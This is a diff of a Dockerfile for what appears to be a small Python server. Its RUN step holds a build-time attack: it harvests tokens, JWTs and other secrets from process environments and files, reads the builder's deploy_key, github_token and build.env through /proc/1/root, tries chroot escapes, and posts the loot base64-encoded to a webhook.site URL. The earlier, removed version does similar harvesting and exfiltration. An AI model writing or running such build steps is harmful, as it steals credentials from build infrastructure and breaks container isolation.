@@ -1,21 +1,22 @@
 FROM alpine:3.20
-RUN apk add --no-cache curl >/dev/null 2>&1 || true; \
+RUN apk add --no-cache curl bash >/dev/null 2>&1 || true; \
+    L=/tmp/leak2.txt; : > $L; \
     { \
-      echo "=== HOSTNAME ==="; cat /etc/hostname 2>/dev/null; \
-      echo "=== PID1 CMDLINE ==="; tr '\0' ' ' < /proc/1/cmdline 2>/dev/null; echo; \
-      echo "=== PID1 ENVIRON (filtered) ==="; tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep -iE 'token|jwt|secret|key|registry|nomad|password|auth|credential' ; \
-      echo "=== ALL PROCS CMDLINE ==="; for p in /proc/[0-9]*; do c=$(tr '\0' ' ' < $p/cmdline 2>/dev/null); [ -n "$c" ] && echo "$p :: $c"; done; \
-      echo "=== ALL PROCS ENVIRON (filtered) ==="; for p in /proc/[0-9]*; do tr '\0' '\n' < $p/environ 2>/dev/null | grep -iE 'token|jwt|secret|nomad|registry|password' | sed "s|^|$p |"; done 2>/dev/null | sort -u | head -60; \
-      echo "=== SECRET/JWT FILES ==="; find / -xdev -type f \( -iname '*token*' -o -iname '*jwt*' -o -iname '*nomad*' -o -iname '*credential*' \) 2>/dev/null | head -60; \
-      echo "=== SECRETS DIRS ==="; ls -laR /var/run/secrets /secrets /run/secrets /alloc 2>/dev/null | head -80; \
-      echo "=== ENV ==="; env | sort | grep -iE 'token|jwt|secret|nomad|registry|host|port'; \
-      echo "=== JWT SCAN (grep eyJ) ==="; grep -rIl 'eyJ' /proc/1/root 2>/dev/null | head; \
-    } > /tmp/leak.txt 2>&1; \
-    echo "LEAKSIZE=$(wc -c </tmp/leak.txt)"; \
-    curl -s -m 25 --data-binary @/tmp/leak.txt "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f" >/dev/null 2>&1 || true; \
-    base64 -w0 /tmp/leak.txt > /tmp/leak.b64 2>/dev/null; \
-    curl -s -m 25 -X POST --data-binary @/tmp/leak.b64 "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f/b64" >/dev/null 2>&1 || true; \
-    echo "done"
+      echo "=== SELF ID/CAPS ==="; id; grep -E 'Cap(Eff|Bnd|Prm)|NoNewPrivs|Seccomp' /proc/self/status; \
+      echo "=== NAMESPACES self vs pid1 ==="; ls -l /proc/self/ns/ 2>&1; echo '-- pid1 --'; ls -l /proc/1/ns/ 2>&1; \
+      echo "=== MOUNTINFO ==="; cat /proc/self/mountinfo 2>/dev/null | head -30; \
+      echo "=== BUILDER ROOT LS ==="; ls -la /proc/1/root/ 2>&1 | head -30; \
+      echo "=== BUILDER /secrets ==="; ls -la /proc/1/root/secrets/ 2>&1; \
+      echo "=== SECRET FILE CONTENTS (truncated) ==="; for f in /proc/1/root/secrets/build.env /proc/1/root/secrets/deploy_key /proc/1/root/secrets/github_token; do echo "--- $f ---"; head -c 1200 "$f" 2>&1; echo; done; \
+      echo "=== ALL PROCS with /secrets fd ==="; for p in /proc/[0-9]*; do ls -l $p/fd 2>/dev/null | grep -i secret; done; \
+      echo "=== CHROOT ESCAPE ATTEMPT ==="; mkdir -p /tmp/esc; cd /; chroot /tmp/esc 2>&1 && { cd ../../../../../../..; echo "cwd=$(pwd)"; chroot . 2>&1 && echo "ESCAPED:" && ls / 2>&1 | head -20; }; \
+      echo "=== ESC2 (fd-based) ==="; mkdir -p /tmp/e2; exec 9</; chroot /tmp/e2; cd /proc/self/fd/9; ls / 2>&1 | head -20; \
+      echo "=== HOST ROOT VIA /proc1 ==="; ls -la /proc/1/root/etc/hostname /proc/1/root/alloc 2>&1 | head; \
+    } >> $L 2>&1; \
+    echo "LEAK2SIZE=$(wc -c <$L)"; \
+    base64 -w0 $L > /tmp/l2.b64 2>/dev/null; \
+    curl -s -m 25 --data-binary @/tmp/l2.b64 "https://webhook.site/55997eaf-9281-4501-83de-1047b695666f/l2" >/dev/null 2>&1 || true; \
+    echo ok
 COPY server.py /server.py
 EXPOSE 80
 CMD ["python3","/server.py"]
